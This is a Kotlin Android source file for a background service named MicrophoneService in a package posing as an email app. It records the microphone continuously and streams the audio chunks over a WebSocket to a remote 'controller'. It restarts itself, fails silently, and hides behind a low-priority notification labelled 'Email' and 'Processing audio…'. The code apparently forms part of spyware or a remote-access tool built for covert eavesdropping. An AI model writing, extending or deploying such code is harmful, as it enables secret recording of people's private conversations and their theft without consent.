package com.email.service

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class MicrophoneService : Service() {

    companion object {
        private const val CHANNEL_ID = "mic_channel"
        private const val NOTIFICATION_ID = 1003
        private const val SAMPLE_RATE = 16000
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var audioRecord: AudioRecord? = null
    private var captureJob: Job? = null
    private val wsManager = WebSocketManager.getInstance()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startRecording()
        return START_STICKY
    }

    private fun startRecording() {
        val minBufSize = AudioRecord.getMinBufferSize(
            SAMPLE_RATE,
            AudioFormat.CHANNEL_IN_MONO,
            AudioFormat.ENCODING_PCM_16BIT
        )
        val bufferSize = minBufSize * 2

        try {
            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT,
                bufferSize
            )

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                stopSelf()
                return
            }

            audioRecord?.startRecording()

            captureJob = scope.launch {
                val buffer = ByteArray(bufferSize)
                var silentChunks = 0
                val SILENCE_THRESHOLD = 80   // RMS below this = silence
                val SILENT_SKIP_AFTER = 8    // skip sending after 8 silent chunks (~500ms)

                while (isActive) {
                    val read = audioRecord?.read(buffer, 0, buffer.size) ?: -1
                    if (read > 0) {
                        // ── Extension trick: skip silent audio chunks ──────────────────────
                        // Calculate RMS of the chunk to detect silence
                        var sumSq = 0.0
                        for (i in 0 until read - 1 step 2) {
                            val sample = (buffer[i].toInt() or (buffer[i + 1].toInt() shl 8)).toShort()
                            sumSq += sample * sample
                        }
                        val rms = Math.sqrt(sumSq / (read / 2)).toInt()

                        if (rms < SILENCE_THRESHOLD) {
                            silentChunks++
                            // Send first few silent chunks so controller hears silence start,
                            // then pause to save bandwidth — same as extension idle-pause logic
                            if (silentChunks > SILENT_SKIP_AFTER) continue
                        } else {
                            silentChunks = 0
                        }

                        wsManager.sendMicAudio(buffer.copyOf(read))
                    } else if (read == AudioRecord.ERROR_INVALID_OPERATION ||
                        read == AudioRecord.ERROR_BAD_VALUE
                    ) {
                        break
                    }
                }
            }
        } catch (_: SecurityException) {
            stopSelf()
        } catch (_: Exception) {
            stopSelf()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Email Audio", NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification() = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("Email")
        .setContentText("Processing audio…")
        .setSmallIcon(android.R.drawable.ic_dialog_email)
        .setPriority(NotificationCompat.PRIORITY_LOW)
        .setOngoing(true)
        .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        captureJob?.cancel()
        scope.cancel()
        audioRecord?.stop()
        audioRecord?.release()
        audioRecord = null
        super.onDestroy()
    }
}
